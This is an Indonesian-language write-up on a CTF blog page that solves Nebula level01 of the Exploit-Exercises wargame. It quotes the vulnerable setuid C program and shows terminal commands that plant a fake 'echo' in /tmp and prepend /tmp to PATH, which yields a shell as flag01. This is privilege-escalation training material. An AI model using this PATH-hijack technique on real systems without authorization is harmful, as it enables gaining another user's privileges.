<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Exploit-Exercises Nebula - Level01</title>
  <meta name="description" content="Executive SummaryChallenge level01 exploit-exercise adalah melakukan modifikasi pada $PATH sehingga dapat melakukan arbitary execution">
  
  <meta name="author" content="rhama">
  <meta name="copyright" content="&copy; rhama 2017">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
  <meta property="og:description" content="Executive SummaryChallenge level01 exploit-exercise adalah melakukan modifikasi pada $PATH sehingga dapat melakukan arbitary execution" />
  <meta property="og:url" content="https://rhama.my.id/2017/01/06/exploit-exercises-nebula-level01.html" />
  <meta property="og:site_name" content="CTF.Ninja" />
  <meta property="og:title" content="Exploit-Exercises Nebula - Level01" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://rhama.my.id/assets/images/CTF.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" />
  

  
  <!-- Twitter: card tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Exploit-Exercises Nebula - Level01">
  <meta name="twitter:description" content="Executive SummaryChallenge level01 exploit-exercise adalah melakukan modifikasi pada $PATH sehingga dapat melakukan arbitary execution">
  <meta name="twitter:image" content="https://rhama.my.id/assets/images/CTF.png">
  <meta name="twitter:url" content="https://rhama.my.id/2017/01/06/exploit-exercises-nebula-level01.html">
  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
   <link rel="stylesheet" href="/css/terminal.css">
  <link rel="canonical" href="https://rhama.my.id/2017/01/06/exploit-exercises-nebula-level01.html">
  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="CTF.Ninja">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
          <li class="nav-link"><a href="/posts/">Archives</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/images/CTF.png);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Exploit-Exercises Nebula - Level01</h1>
      <p class="info">by <strong>CTF.Ninja</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">January 6, 2017</div>
  <div class="post-categories">
  
  </div>
</section>

<article class="post-content">
  <h1 id="executive-summary">Executive Summary</h1>
<p>Challenge level01 exploit-exercise adalah melakukan modifikasi pada $PATH sehingga dapat melakukan arbitary execution</p>

<h1 id="about">About</h1>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<h1 id="source-code">Source code</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#include &lt;stdlib.h&gt;</span>
<span class="c">#include &lt;unistd.h&gt;</span>
<span class="c">#include &lt;string.h&gt;</span>
<span class="c">#include &lt;sys/types.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>

int main<span class="o">(</span>int argc, char <span class="k">**</span>argv, char <span class="k">**</span>envp<span class="o">)</span>
<span class="o">{</span>
  gid_t gid;
  uid_t uid;
  gid <span class="o">=</span> getegid<span class="o">()</span>;
  uid <span class="o">=</span> geteuid<span class="o">()</span>;

  setresgid<span class="o">(</span>gid, gid, gid<span class="o">)</span>;
  setresuid<span class="o">(</span>uid, uid, uid<span class="o">)</span>;

  system<span class="o">(</span><span class="s2">"/usr/bin/env echo and now what?"</span><span class="o">)</span>;
<span class="o">}</span></code></pre></figure>

<h1 id="proof-of-concept">Proof Of Concept</h1>

<p>Pada source code .c diatas terdapat bug pada <code class="highlighter-rouge">system("/usr/bin/env echo and now what?")</code> yang pada command <code class="highlighter-rouge">echo</code> tidak menggunakan PATH lengkapnya, sehingga kita  dapat membuat file baru bernama echo yang berisikan <code class="highlighter-rouge">/bin/bash</code> dan memodifikasi $PATH agar file ‘evil echo’ yang kita buat dapat tereksekusi dan mendapatkan shell access sebagai user flag01.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sh-4.2$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> &gt; /tmp/echo
<span class="gp">sh-4.2$ </span>chmod +x /tmp/echo
<span class="gp">sh-4.2$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"/tmp/"</span>:<span class="nv">$PATH</span>
<span class="gp">sh-4.2$ </span>./flag01
<span class="gp">flag01@nebula:/home/flag01$ </span>getflag
You have successfully executed getflag on a target account</code></pre></figure>


</article>



<section class="tags">
  <strong>Tags:</strong> <a href="/tag/exploit-exercises.com">exploit-exercises.com</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Exploit-Exercises+Nebula+-+Level01&u=https%3A%2F%2Frhama.my.id%2F2017%2F01%2F06%2Fexploit-exercises-nebula-level01.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/2017/01/06/exploit-exercises-nebula-level01.html') + '&title=Exploit-Exercises Nebula - Level01'; return false">
        <i class="fa fa-reddit-square fa-lg"></i>
      </a>
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">CTF.Ninja</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
          <li class="nav-link"><a href="/posts/">Archives</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:r4m@protonmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">r4m@protonmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
              <i class="fa fa-facebook"></i>
              <span class="username">eat.sleep.pwn.repeat</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">CTF, InfoSec, Banana And More.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
